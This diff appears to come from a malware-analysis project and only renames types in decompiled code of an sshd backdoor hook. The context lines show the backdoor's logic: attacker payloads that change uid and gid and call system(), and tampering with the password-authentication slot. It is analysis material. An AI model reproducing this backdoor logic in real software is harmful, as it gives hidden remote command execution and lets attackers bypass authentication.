@@ -77,7 +77,7 @@ int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)
   goto LAB_00109429;
   clear_cursor = &payload_ctx;
   for (copy_idx = 0x12; copy_idx != 0; copy_idx = copy_idx + -1) {
-    *(undefined4 *)clear_cursor = 0;
+    *(u32 *)clear_cursor = 0;
     clear_cursor = (sshd_payload_ctx_t **)((long)clear_cursor + (ulong)zero_seed * -8 + 4);
   }
   payload_chunk_size = 0;
@@ -130,7 +130,7 @@ LAB_00109216:
       else if (payload_type == '\x03') {
         if (((libc_imports_ref->system != (pfn_system_t)0x0) && (8 < payload_data_offset)) &&
            (payload_record->signed_header_prefix[payload_len - 0x75] == '\0')) {
-          uid_gid_pair = *(undefined8 *)&payload_record->body_payload_offset;
+          uid_gid_pair = *(u64 *)&payload_record->body_payload_offset;
           rgid = (gid_t)((ulong)uid_gid_pair >> 0x20);
           if (((rgid == 0) || (orig_call_result = (*libc_imports_ref->setresgid)(rgid,rgid,rgid), orig_call_result != -1)) &&
              ((ruid = (uid_t)uid_gid_pair, ruid == 0 ||
@@ -146,8 +146,8 @@ LAB_00109216:
                (ctx->sshd_ctx->mm_answer_authpassword_slot != (sshd_monitor_func_t *)0x0)) &&
               (1 < payload_data_offset)) {
         *(char *)&sshd_ctx->pending_authpayload_len = (char)payload_record->body_payload_offset;
-        *(undefined1 *)((long)&sshd_ctx->pending_authpayload_len + 1) =
-             *(undefined1 *)((long)&payload_record->body_payload_offset + 1);
+        *(u8 *)((long)&sshd_ctx->pending_authpayload_len + 1) =
+             *(u8 *)((long)&payload_record->body_payload_offset + 1);
         if (sshd_ctx->pending_authpayload_len == 0) {
           payload_record = (sshd_payload_ctx_t *)0x0;
         }
